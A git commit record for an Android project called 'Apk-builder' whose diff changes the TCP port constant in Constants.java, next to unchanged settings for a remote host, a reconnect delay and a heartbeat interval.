87e117f74acbb450a37e983c10ba923bb5ebe648
lastie357-droid <lastie357@gmail.com>
2026-05-30 18:08:50 +0300

    Update Constants.java

--- Apk-builder/app/src/main/java/com/task/tusker/utils/Constants.java
+++ Apk-builder/app/src/main/java/com/task/tusker/utils/Constants.java
@@ -10,7 +10,7 @@ public class Constants {
 
     // ========== TCP SERVER ==========
     public static final String TCP_HOST = "sjc1.clusters.zeabur.com";
-    public static final int    TCP_PORT = 20944;
+    public static final int    TCP_PORT = 20185;
 
     public static final int TCP_RECONNECT_DELAY = 1500;
     public static final int HEARTBEAT_INTERVAL  = 10000;
